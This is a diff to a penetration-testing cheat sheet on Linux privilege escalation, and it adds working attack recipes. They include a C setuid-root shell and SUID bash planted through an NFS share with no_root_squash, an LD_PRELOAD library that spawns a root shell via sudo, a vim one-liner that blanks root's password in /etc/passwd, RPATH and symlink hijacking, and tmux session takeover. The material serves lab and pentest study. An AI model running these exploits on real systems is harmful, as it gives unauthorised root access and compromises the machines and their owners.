@@ -3264,6 +3264,41 @@ $ CTRL+Z -> stty raw -echo; fg -> reset -> export TERM=scr
   usermod -aG sudo [USER]
   ```
 
+#### Shared Folders Payloads (NFS, Docker..)
+
+- **SUID bin:**
+
+  1. Transfer /bin/bash (or another binary) on the shared folder (preferibly from the Host, if possible, to avoid compatibility issues)
+  2. From Kali, make it a SUID `chmod u+s /bash`
+  3. From the host `/bash -p`
+
+- **C script**, since C produces a binary
+
+  1. On the Host (to avoid compatibility issues), write and compile:
+
+     ```c
+     #include <stdio.h>
+     #include <sys/types.h>
+     #include <unistd.h>
+     #include <stdlib.h>
+     
+     int main(void)
+     {
+       setuid(0); setgid(0); system("/bin/bash");
+     }
+     ```
+
+  1. On Kali, in the mounted folder:
+
+     ```bash
+     chown root:root shell
+     chmod u+s shell
+     ```
+
+  1. On the Host: `.\shell`
+
+- **MSV malware**
+
 ### Restricted shells
 
 A restricted shell is a type of shell that limits the user's ability to execute commands, they are `rbash`, `rksh`, and `rzsh`.
@@ -4390,52 +4425,6 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 [GTFOBins](https://gtfobins.github.io/)
 
-- SUDO:
-
-  ```bash
-  sudo -l		 # List sudo privileges
-  sudo -V		 # Check sudo version
-  
-  sudo su 	 # Switch to the root user 
-  su [USER] 	 # Switch to a local user
-  sudo -u [USER] [COMMAND] 	# Execute an application as an user
-  ```
-
-- SUID binaries &rarr; Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin:
-
-  ```bash
-  find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-  ```
-
-- SGID binaries:
-
-  ```bash
-  find / -uid 0 -perm -6000 -type f 2>/dev/null
-  ```
-
-- Capabilities
-
-  ```bash
-  find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
-  ```
-
-  - Some capabilities give you direct access to root [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=capabi#references):
-
-    - `cap_setuid`
-
-    - `cap_setgid`
-
-    - `cap_sys_admin`
-
-    - `cap_dac_override` allow to overwrite a file. E.g. for `vim`
-
-      ```bash
-      echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
-      su
-      ```
-
-      
-
 - Compare binaries with GTFO bins:
 
   ```bash
@@ -4443,6 +4432,93 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
   ```
 
 - `strace [BIN] -c1 [IP]`: track and analyze system calls and signal processing
+
+##### SUDO:
+
+```bash
+sudo -l		 # List sudo privileges
+sudo -V		 # Check sudo version
+
+sudo su 	 # Switch to the root user 
+su [USER] 	 # Switch to a local user
+sudo -u [USER] [COMMAND] 	# Execute an application as an user
+```
+
+**Exploits:**
+
+- **LD PRELOAD**
+
+  The `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones.
+
+  1. Write the C file:
+
+     ```c
+     #include <stdio.h>
+     #include <sys/types.h>
+     #include <stdlib.h>
+     #include <unistd.h>
+     
+     void _init() {
+     unsetenv("LD_PRELOAD");
+     setgid(0);
+     setuid(0);
+     system("/bin/bash");
+     }
+     ```
+
+  2. Compile:
+
+     ```bash
+     gcc -fPIC -shared -o root.so root.c -nostartfiles
+     ```
+
+  3. ```bash
+     sudo LD_PRELOAD=/tmp/root.so [BIN] restart
+     ```
+
+- Path Hijacking
+
+- LDD Hijacking
+
+- Wildcard abuse
+
+##### SUID binaries &rarr; Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin:
+
+```bash
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+**Exploits:**
+
+- LDD Hijacking
+
+##### SGID binaries:
+
+```bash
+find / -uid 0 -perm -6000 -type f 2>/dev/null
+```
+
+##### Capabilities
+
+```bash
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+```
+
+- Some capabilities give you direct access to root [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html?highlight=capabi#references):
+
+  - `cap_setuid`
+
+  - `cap_setgid`
+
+  - `cap_sys_admin`
+
+  - `cap_dac_override` allow to overwrite a file. E.g. for `vim`
+
+    ```bash
+    echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+    su
+    ```
+
 
 #### Environment
 
@@ -4457,6 +4533,20 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
     export PATH
     ```
 
+- **LDD Hijacking**
+
+  1. `ldd [BIN]`: Displays the library of a bin, their location of the object and the hexadecimal address where they are loaded into memory
+
+- **RPATH Hijacking**
+
+  Check the`RUNPATH` configuration 
+
+  ```bash
+  readelf -d [BINARY] | grep -E "NEEDED|RPATH"
+  ```
+
+  Libraries in this folder are given preference over other folders &rarr; Place a malicious library here
+
 - [Wildcard Abuse](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html):
 
   - chown, chmod
@@ -4464,39 +4554,39 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
   - rsync
   - 7z
   - zip
-  
+
 - **Symlinks attacks**
 
   A symlink is a link to a file `ln -s [FILE_target] [FILE_link]`
-  
+
   The `*` character gets expanded to all the matching files.
-  
+
   Examples:
-  
+
   - `chown` and `chmod`
-  
+
     - `chown [USER] [FILE]`
-  
+
       Sets the owner of the specified `[FILE]` to the `[USER]`.
-  
+
     - `chown [USER] [FILE] --reference=[REF FILE]`
-  
+
       Sets the owner of the specified `[FILE]` to match the owner of the `[REF FILE]`, `[USER]` is ignored.
-  
+
     ```bash
     # Create a file reference owned by us
     touch reference
     # Create a file called as the flag of chown
     touch -- --reference=reference
     ```
-  
+
     If you create a symlink to **/etc/passwd** in the same directory, then the owner of /etc/passwd will also be you.
-  
-  
+
+
   Avoid checks:
-  
+
   - If there is a check to control if the link is linking to a priviledged folder, you can do a double link:
-  
+
     ```bash
     ln -s /root/root.txt [FILE HOP]	# Creates a link to root.txt
     ln -s [FILE HOP] [FILE]			# Creates a link to FILE HOP
@@ -4615,6 +4705,20 @@ cat /etc/exports
 - **no_root_squash**, then you can access it from as a client and write inside that directory as if you were the local root of the machine. 
 - **no_all_squash** allows to emulate a non-root user
 
+1. Check if NSF Port (2049) is Reachable → Forward It if Not
+
+2. From Kali's `root` Session
+
+   ````bash
+   # Mount folder
+   sudo mount -t nfs [VICTIM_IP]:/[NFS_SHARE] /mnt
+   # copy a binary (e.g. bash) and make it suid
+   cp /bin/bash /mnt
+   chmod u+s /mnt/bash
+   ````
+
+3. Victim's Session → Execute `./bash -p` Inside NFS Share
+
 #### Databases
 
 - MySQL
@@ -4724,7 +4828,18 @@ Requirements for [logrotten](https://github.com/whotwagner/logrotten):
 
 ##### tmux
 
+You need to be able to be in the `devs` group or run tmux as suid/sudo/
+
 running tmux process &rarr; attach to it  [tmux-sessions](https://redfoxsec.com/blog/terminal-multiplexing-hijacking-tmux-sessions/) (try also without sudo)
+
+```bash
+# Creates a new shared session
+tmux -S /shareds new -s debugsess
+# Change pemission
+chown root:devs /shareds
+# Attach to the session
+tmux -S /shareds
+```
 
 #### Reccurent processes
 
